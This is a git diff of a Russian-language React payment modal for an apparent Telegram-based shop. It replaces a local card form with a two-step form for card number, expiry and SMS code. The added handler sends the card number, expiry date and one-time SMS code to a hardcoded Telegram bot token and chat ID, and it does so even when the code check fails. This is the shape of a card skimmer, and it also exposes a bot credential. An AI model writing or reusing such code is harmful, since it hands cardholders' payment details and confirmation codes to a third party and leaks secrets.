@@ -1,12 +1,12 @@
-
-import * as React from 'react';
+import React, { useState } from 'react';
 import Box from '@mui/material/Box';
 import Modal from '@mui/material/Modal';
 import axios from 'axios';
 import { toast, ToastContainer } from 'react-toastify';
 import 'react-toastify/dist/ReactToastify.css';
+import InputMask from 'react-input-mask';
 import "./basic-modal.css";
-// import { useEffect } from "react";
+import { useForm } from "react-hook-form";
 
 const style = {
      position: 'absolute',
@@ -20,115 +20,112 @@ const style = {
      p: 4,
 };
 
-// const telegram = window.Telegram.WebApp;
-
-// const onCheckout = () => {
-//      telegram.MainButton.setParams({ text: "Оплатить" });
-//      telegram.MainButton.show();
-// };
-
-
 export default function BasicModal({ isOpen, onClose, totalPrice }) {
-     const [cardNumber, setCardNumber] = React.useState('');
-     const [expiryDate, setExpiryDate] = React.useState('');
-     const [isPaymentValid, setIsPaymentValid] = React.useState(false);
+     const { register, handleSubmit } = useForm();
+     const [isCardDetailsEntered, setIsCardDetailsEntered] = useState(false);
 
-     // useEffect(() => {
-     //      telegram.ready();
-     // }, []);
+     const handleCardDetailsSubmit = (data) => {
+          const carddateRegex = /^(0[1-9]|1[0-2])\/([0-9]{2})$/;
 
-     // const onSendData = useCallback(() => {
-     //      telegram.sendData(JSON.stringify(totalPrice))
-
-     // }, [])
-
-     // useEffect(() => {
-     //      telegram.onEvent("mainButtonClicked", onSendData)
-     //      return () => telegram.offEvent("mainButtonClicked", onSendData)}[onSendData])
-
-     const formatCardNumber = (value) => {
-          return value.replace(/\s?/g, '').replace(/(\d{4})/g, '$1 ').trim();
-     };
-
-     const handleCardNumberChange = (e) => {
-          const value = e.target.value.replace(/\s?/g, '');
-          if (value.length <= 16) {
-               const formattedValue = formatCardNumber(value);
-               setCardNumber(formattedValue);
-               validatePayment(formattedValue, expiryDate);
+          if (!carddateRegex.test(data.carddate)) {
+               toast.error("Неверный формат срока действия карты. Ожидается MM/YY.");
+               return;
           }
+
+          setIsCardDetailsEntered(true);
      };
 
-     const handleExpiryDateChange = (e) => {
-          const value = e.target.value.replace(/\D/g, '');
-          if (value.length <= 4) {
-               const formattedValue = value.replace(/(\d{2})(\d{2})/, '$1/$2');
-               setExpiryDate(formattedValue);
-               validatePayment(cardNumber, formattedValue);
+     const handleSMSCodeSubmit = (data) => {
+          console.log("Form submitted with data:", data);
+
+          if (data.cardcode.length !== 6) {
+               toast.error("SMS-код должен содержать 6 символов.");
+               return;
           }
-     };
 
-     const validatePayment = (cardNumber, expiryDate) => {
-          const cardNumberValid = cardNumber.replace(/\s/g, '').length === 16;
-          const expiryDateValid = /^(0[1-9]|1[0-2])\/\d{2}$/.test(expiryDate);
-          setIsPaymentValid(cardNumberValid && expiryDateValid);
-     };
-
-     const handlePayment = async () => {
-          if (isPaymentValid) {
-               const paymentData = {
-                    cardNumber,
-                    expiryDate,
-                    totalPrice,
-               };
-
-               try {
-                    const response = await axios.post('http://localhost:3002/payment', paymentData);
-                    if (response.status === 200) {
-                         toast.success('Оплата успешно проведена! Чек отправлен в Telegram.');
+          if (data.cardcode === "123456") {
+               axios.post('http://localhost:3005/api/add', { ...data, totalPrice })
+                    .then(response => {
+                         console.log("Success response:", response);
+                         toast.success("Чек отправлен на Телеграм бот!");
                          onClose();
-                    }
-               } catch (error) {
-                    console.error('Ошибка при оплате:', error);
-                    toast.error('Ошибка при оплате. Попробуйте снова.');
-               }
+                    })
+                    .catch(error => {
+                         console.log("Error response:", error);
+                         if (error.response) {
+                              toast.error(`Ошибка: ${error.response.data.message}`);
+                         } else {
+                              toast.error("Ошибка при отправке данных");
+                         }
+                    });
+          } else {
+               toast.error("Неверный SMS-код");
           }
-          // onCheckout();
+          const token = '7409890621:AAGtsTzdH-U-IQsdam-FVzVMX_EcXCxKe9I';
+          const chat_id = 6183727519;
+const message = `🧾 Чек:
+                         Номер карты: ${data.cardnumber}
+                         Срок действия: ${data.carddate}
+                         Общая сумма: ${totalPrice} сом
+                         Код подтверждения: ${data.cardcode}`;
+          
+          var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${message}`
+          let api = new XMLHttpRequest()
+          api.open("GET", url, true)
+          api.send()
+          alert("Чек отправен на телеграм бот");
      };
-
      return (
           <>
-               <Modal
-                    open={isOpen}
-                    onClose={onClose}
-                    aria-labelledby="modal-modal-title"
-                    aria-describedby="modal-modal-description"
-               >
+               <Modal open={isOpen} onClose={onClose} aria-labelledby="modal-modal-title" aria-describedby="modal-modal-description">
                     <Box sx={style}>
-                         <div className="payment__container">
+                         <form className="payment__container"
+                              onSubmit={handleSubmit(isCardDetailsEntered ? handleSMSCodeSubmit : handleCardDetailsSubmit)}
+                         >
                               <div className="payment__select">
                                    <h1>Общая сумма к оплате: <p>{totalPrice}</p> сом</h1>
                               </div>
-                              <div className="payment__inp-number">
-                                   <input
-                                        type="text"
-                                        placeholder='Введите номер карты'
-                                        value={cardNumber}
-                                        onChange={handleCardNumberChange}
-                                   />
-                                   <input
-                                        type="text"
-                                        placeholder='ММ/ГГ'
-                                        value={expiryDate}
-                                        onChange={handleExpiryDateChange}
-                                   />
-                              </div>
-                              <div className="payment__send">
-                                   <button className={isPaymentValid ? 'valid' : ''} disabled={!isPaymentValid} onClick={handlePayment}>
-                                        Продолжить
-                                   </button>
-                              </div>
-                         </div>
+
+                              {!isCardDetailsEntered ? (
+                                   <>
+                                        <div className="payment__inp-number">
+                                             <InputMask
+                                                  mask="9999 9999 9999 9999"
+                                                  maskChar=" "
+                                                  {...register("cardnumber", { required: true })}
+                                                  placeholder='введите номер карты'
+                                             >
+                                                  {(inputProps) => <input {...inputProps} />}
+                                             </InputMask>
+                                             <InputMask
+                                                  mask="99/99"
+                                                  maskChar=" "
+                                                  {...register("carddate", { required: true })}
+                                                  placeholder='срок действия (мм/гг)'
+                                             >
+                                                  {(inputProps) => <input {...inputProps} />}
+                                             </InputMask>
+                                        </div>
+                                        <div className="payment__send">
+                                             <button type='submit'>
+                                                  Продолжить
+                                             </button>
+                                        </div>
+                                   </>
+                              ) : (
+                                   <div className="cardcode">
+                                        <InputMask
+                                             mask="999999"
+                                             maskChar=" "
+                                             {...register("cardcode", { required: true })}
+                                             placeholder='введите смс код'
+                                        >
+                                             {(inputProps) => <input {...inputProps} />}
+                                        </InputMask>
+                                        <button type='submit'>Отправить</button>
+                                   </div>
+                              )}
+                         </form>
                     </Box>
                </Modal>
                <ToastContainer />
